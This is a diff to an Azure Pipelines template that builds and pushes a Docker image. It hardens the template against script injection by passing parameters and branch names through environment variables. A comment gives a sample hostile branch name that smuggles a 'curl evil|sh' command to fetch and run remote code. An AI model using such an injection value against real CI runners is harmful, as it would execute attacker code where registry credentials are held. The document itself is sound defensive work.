@@ -36,44 +36,68 @@ steps:
       containerRegistry: "${{ parameters.CONTAINER_REGISTRY_SERVICE_CONNECTION }}"
       command: 'login'
 
+  # Every template parameter and predefined variable this script reads is passed
+  # through `env:` instead of being interpolated into the script text.
+  #
+  # `${{ }}` is substituted by Azure into the YAML *before* the agent runs it, so
+  # a value carrying a quote or a newline used to become script rather than data.
+  # `$(Build.SourceBranchName)` is the one that makes this concrete rather than
+  # theoretical: it is a BRANCH NAME, so anyone who can open a pull request
+  # chooses it, and a branch called `x";curl evil|sh;#` executed on the runner
+  # that holds this pipeline's registry credentials. Through `env:` the shell
+  # expands these at run time and a hostile value stays a string.
   - script: |
-      dockerImageName=$(Build.Repository.Name)
-      if [ -n "${{ parameters.IMAGE_NAME }}" ]; then
-        dockerImageName="${{ parameters.IMAGE_NAME }}"
+      dockerImageName="$BUILD_REPOSITORY_NAME"
+      if [ -n "$IMAGE_NAME_PARAM" ]; then
+        dockerImageName="$IMAGE_NAME_PARAM"
       fi
-      imageName="${{ parameters.CONTAINER_REGISTRY_SERVER }}/$dockerImageName"
+      imageName="$REGISTRY_SERVER/$dockerImageName"
 
       TAGS="$imageName:latest"
-      if [[ "$(Build.SourceBranch)" == refs/tags/* ]]; then
-        TAGS="$TAGS -t $imageName:$(Build.SourceBranchName)"
-        containerImageTagName="$imageName:$(Build.SourceBranchName)"
+      if [[ "$BUILD_SOURCE_BRANCH" == refs/tags/* ]]; then
+        TAGS="$TAGS -t $imageName:$BUILD_SOURCE_BRANCH_NAME"
+        containerImageTagName="$imageName:$BUILD_SOURCE_BRANCH_NAME"
       else
         containerImageTagName="$TAGS"
       fi
 
       echo "##vso[task.setvariable variable=CONTAINER_IMAGE;isOutput=true]$containerImageTagName"
 
-      ${{ parameters.RUN_BEFORE_BUILD }}
+      eval "$PIPELINES_HOOK"
 
       docker buildx create --use
-      if [ -n "${{ parameters.DOCKER_CACHE_DIR }}" ]; then
-        CACHE_FROM="--cache-from=type=local,src=${{ parameters.DOCKER_CACHE_DIR }}"
-        CACHE_TO="--cache-to=type=local,dest=${{ parameters.DOCKER_CACHE_DIR }},mode=max"
+      if [ -n "$DOCKER_CACHE_DIR_PARAM" ]; then
+        CACHE_FROM="--cache-from=type=local,src=$DOCKER_CACHE_DIR_PARAM"
+        CACHE_TO="--cache-to=type=local,dest=$DOCKER_CACHE_DIR_PARAM,mode=max"
       else
         CACHE_FROM=""
         CACHE_TO=""
       fi
-      docker buildx build ${{ parameters.DOCKER_BUILD_ARGS }} \
+      # `$DOCKER_BUILD_ARGS_PARAM`, `$TAGS`, `$CACHE_FROM` and `$CACHE_TO` are
+      # deliberately UNQUOTED: each holds several argv words that must split.
+      docker buildx build $DOCKER_BUILD_ARGS_PARAM \
         --platform linux/amd64,linux/arm64 \
         --tag $TAGS \
-        --label "org.opencontainers.image.revision=$(Build.SourceVersion)" \
-        --label "org.opencontainers.image.ref.name=$(Build.SourceBranchName)" \
+        --label "org.opencontainers.image.revision=$BUILD_SOURCE_VERSION" \
+        --label "org.opencontainers.image.ref.name=$BUILD_SOURCE_BRANCH_NAME" \
         --label "org.opencontainers.image.created=$(date -u +'%Y-%m-%dT%H:%M:%SZ')" \
-        --label "org.opencontainers.image.source=$(Build.Repository.Uri)" \
+        --label "org.opencontainers.image.source=$BUILD_REPOSITORY_URI" \
         $CACHE_FROM \
         $CACHE_TO \
-        --file ${{ parameters.DOCKER_FILE }} \
+        --file "$DOCKERFILE_PATH" \
         --push .
     name: 'build'
     workingDirectory: "${{ parameters.WORKING_DIRECTORY }}"
     displayName: 'Build and Push Docker Image'
+    env:
+      IMAGE_NAME_PARAM: ${{ parameters.IMAGE_NAME }}
+      REGISTRY_SERVER: ${{ parameters.CONTAINER_REGISTRY_SERVER }}
+      DOCKER_CACHE_DIR_PARAM: ${{ parameters.DOCKER_CACHE_DIR }}
+      DOCKER_BUILD_ARGS_PARAM: ${{ parameters.DOCKER_BUILD_ARGS }}
+      DOCKERFILE_PATH: ${{ parameters.DOCKER_FILE }}
+      PIPELINES_HOOK: ${{ parameters.RUN_BEFORE_BUILD }}
+      BUILD_REPOSITORY_NAME: $(Build.Repository.Name)
+      BUILD_SOURCE_BRANCH: $(Build.SourceBranch)
+      BUILD_SOURCE_BRANCH_NAME: $(Build.SourceBranchName)
+      BUILD_SOURCE_VERSION: $(Build.SourceVersion)
+      BUILD_REPOSITORY_URI: $(Build.Repository.Uri)
